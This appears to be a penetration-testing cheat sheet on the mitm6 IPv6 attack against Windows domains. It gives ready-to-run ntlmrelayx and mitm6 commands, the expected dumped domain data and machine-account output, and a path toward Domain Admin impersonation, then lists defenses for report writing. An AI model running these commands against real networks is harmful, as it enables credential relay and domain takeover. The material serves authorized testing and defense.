# IPv6 Attack (mitm6)

> These are internal network attacks that require the attacker to already be on the same network segment. Common in lab environments, assumed-breach scenarios, and red team engagements where physical or VPN access is established.

---

## What It Is

**Zero credentials required — only network presence on the same broadcast domain as the targets.**

Windows prefers IPv6 over IPv4 by default, even when the network has no IPv6 infrastructure. mitm6 exploits this:

1. **mitm6** spoofs DHCPv6 responses → tells every machine on the network "I am the IPv6 router/DNS server"
2. Machines start routing IPv6 traffic through you and asking your fake DNS server for names
3. Windows machines periodically request a **WPAD** (Web Proxy Auto-Discovery) config — they ask DNS for `wpad.domain.local`
4. Your fake DNS responds → machine fetches WPAD config from you → requires NTLM auth
5. **ntlmrelayx** receives those credentials and relays them to LDAP/LDAPS on the Domain Controller
6. Result: new domain computer account created, domain data dumped to `lootme/` folder

**Why LDAP vs SMB?** DCs enforce SMB signing (cannot relay there). But LDAP/LDAPS does NOT enforce signing by default — so you CAN relay to the DC itself, which gives you much more power.

---

## Attack Steps

### Step 1 — Start ntlmrelayx FIRST (it needs to be ready)

```sh
ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.domain.local -l lootme
```

| Flag | What it does | Where to get the value |
|---|---|---|
| `-6` | Listen on IPv6 | Always include |
| `-t ldaps://<DC-IP>` | Relay target — LDAP on DC | From nmap or `nslookup domain.local` |
| `-wh fakewpad.domain.local` | Hostname for your fake WPAD server | Make up any hostname in the domain |
| `-l lootme` | Folder to dump collected domain data | Creates `./lootme/` directory |

### Step 2 — Start mitm6 (second terminal)

```sh
sudo mitm6 -d domain.local
```

| Flag | What it does |
|---|---|
| `-d domain.local` | Target domain — only poison this domain's traffic |

mitm6 begins responding to DHCPv6 requests and DNS queries.

### Step 3 — Wait

When a machine on the network reboots, a user logs in, or Group Policy refreshes (every 90 min) → WPAD request fires → credentials relayed to DC → ntlmrelayx dumps data.

---

## What You Get

**In the `lootme/` folder:**
```
lootme/
├── domain_computers.html       # all computer accounts in the domain
├── domain_computers.json
├── domain_groups.html          # all groups
├── domain_groups.json
├── domain_users.html           # all user accounts with attributes
├── domain_users.json
├── domain_policy.html          # password policy, lockout settings
└── domain_trusts.html          # domain trusts
```

If ntlmrelayx successfully creates a machine account, you get:
```
[*] Delegation rights modified successfully!
[*] computername$ can now impersonate users on the domain via S4U2Proxy
[*] Created user account: DESKTOP-ABC123$ with password: <random>
```

This machine account + S4U2Proxy rights → full RBCD attack path → impersonate Domain Admin.

---

## Defense (For Report Writing)

**Option 1 — Block DHCPv6 Traffic**
Windows Firewall GPO — create inbound rules to block:
- UDP port 546 (DHCPv6 client)
- UDP port 547 (DHCPv6 server)
- IPv6 Router Advertisement (ICMPv6 type 134)

**Option 2 — Disable IPv6 If Not Needed**
Registry:
```
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters
DisabledComponents = 0xFF
```
Or via PowerShell: `Disable-NetAdapterBinding -Name "*" -ComponentID ms_tcpip6`

**Option 3 — Disable WPAD**
GPO: Computer Configuration → Administrative Templates → Windows Components → Internet Explorer → **Disable caching of Auto-Proxy scripts** → Enabled

Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad\WpadOverride = 1`

**Option 4 — LDAP Signing + Channel Binding**
Requires attackers to sign LDAP requests — prevents relay to LDAP even if credentials are captured.
GPO: `Domain controller: LDAP server signing requirements` → **Require signing**

**Why this matters for the report:**
IPv6 attacks work on virtually every Windows network that has not explicitly disabled IPv6 (most have not). Combined with RBCD or creating a new machine account, this can achieve domain compromise with zero initial credentials — making it one of the highest-impact network-level findings.
